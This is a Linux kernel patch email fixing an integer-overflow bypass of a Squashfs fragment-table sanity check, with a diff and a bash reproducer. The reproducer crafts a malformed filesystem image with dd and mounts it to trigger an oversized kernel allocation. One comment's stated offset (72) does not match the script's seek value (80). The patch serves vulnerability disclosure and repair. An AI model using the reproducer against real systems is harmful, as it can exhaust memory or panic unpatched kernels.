@@ -1,0 +1,161 @@
+From: Phillip Lougher <phillip@squashfs.org.uk>
+Date: Wed, 11 Nov 2026 23:43:49 +0000
+Subject: [PATCH] Squashfs: fix fragment index table length too large exploit
+
+An attacker can manipulate the fragment count and the fragment table
+start values in the superblock, and force the code to kmalloc()
+a 4 Mbyte memory region, or try to allocate larger values which
+will fail with a warning, and which will panic the kernel if panic on
+warn is set.
+
+If the allocation succeeds, these invalid values will be caught when the
+code tries to read the data from disk, but, this leaves a small time
+window where the 4 Mbyte block is allocated before being freed when
+the mount of the filesystem fails.
+
+The exploit relies on arithmetic overflow to evade the following sanity
+check:
+
+	if (fragment_table_start + length > next_table)
+
+Specifically, the values of fragment_table_start and length can be
+chosen so that they overflow an unsigned long long, and so appear less
+than next_table.
+
+Typically, the maximum memory that can be allocated with kmalloc() is
+4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
+needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
+length.
+
+This value is beyond the end of any block device, because the maximum
+block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
+bytes).
+
+In practice this means such a large value will be caught when the code
+immediately after allocation tries to read the data off disk:
+
+ 	table = squashfs_read_table(sb, fragment_table_start, length);
+
+However, the code should check for validity before allocating a large
+kmalloc() area, because such allocations can cause memory pressure or
+cause the kernel to panic.
+
+This commit checks that fragment_tables_size is not too large, and
+ensures arithmetic overflow does not occur.
+
+It also makes the sanity check more exacting by utilising the fact that
+there should be zero gap between the end of the fragment index table and
+the next table.
+
+Reproducer
+=========
+
+The following script if the eploit works, will fail with the mount
+error
+
+mount: attempt to access beyond end of device
+
+=================================================================
+#!/bin/bash
+
+ARGS="-quiet -no-progress"
+
+finish() {
+	popd 2>&1 > /dev/null
+	rm -rf $DIR
+	exit 1
+}
+
+# Create a Squashfs filesystem with a single file.
+#
+DIR=$(mktemp -d)
+
+pushd $DIR 2>&1 > /dev/null
+
+echo Create the Squashfs filesystem
+
+if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
+	echo Failed to create Squashfs filesystem
+	finish
+
+fi
+
+# The fragments field (fragment count) in the superblock is at offset
+# 16 bytes.
+#
+# Over-write the fragments count with 268,435,456 little-endian.
+# This will make the kernel try to kmalloc() 4 Mbytes to hold the
+# fragment index table.
+#
+
+# Write 268,435,456 in little-endian format to file
+/usr/bin/echo -en "\x00\x00\x00\x10" > file
+
+# Over-write the fragments count in the superblock
+echo Over-write the fragments count in the superblock
+
+dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none
+
+# The fragment table start (start of the index table) in the superblock
+# is at offset 72 bytes.
+#
+# Over-write the value with 2^64 - 4 Mbytes little-endian.
+# This value with the index table length will overflow an unsigned
+# long long, giving the value 0.  This will evade the sanity check.
+
+# Write 2^64 - 4 Mbytes in little-endian format to file
+/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file
+
+# Over-write the fragment table start in the superblock
+echo Over-write the fragment table start in the superblock
+
+dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none
+
+# Mount the filesystem to /mnt
+echo Mount the filesystem to /mnt
+
+# If the eploit works, the mount will fail with
+# mount: attempt to access beyond end of device
+
+if ! mount -t squashfs img.sqsh /mnt; then
+	echo Mount of Squashfs filesystem failed
+	finish
+fi
+
+popd 2>&1 > /dev/null
+
+rm -rf $DIR
+=================================================================
+
+Link: https://lore.kernel.org/20261111234402.252354-10-phillip@squashfs.org.uk
+Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
+Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
+Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
+Cc: Phillip Lougher <phillip.lougher@gmail.com>
+---
+ fs/squashfs/fragment.c | 8 ++++----
+ 1 file changed, 4 insertions(+), 4 deletions(-)
+
+diff --git a/fs/squashfs/fragment.c b/fs/squashfs/fragment.c
+index e945d045d55ec..9f63e5b5c5130 100644
+--- a/fs/squashfs/fragment.c
++++ b/fs/squashfs/fragment.c
+@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_table(struct super_block *sb,
+ 	__le64 *table;
+ 
+ 	/*
+-	 * Sanity check, length bytes should not extend into the next table -
+-	 * this check also traps instances where fragment_table_start is
+-	 * incorrectly larger than the next table start
++	 * The computed size of the index table (length bytes) should exactly
++	 * match the table start and end points
+ 	 */
+-	if (fragment_table_start + length > next_table)
++	if (fragment_table_start >= next_table ||
++				length != (next_table - fragment_table_start))
+ 		return ERR_PTR(-EINVAL);
+ 
+ 	table = squashfs_read_table(sb, fragment_table_start, length);
+-- 
+2.47.3
+
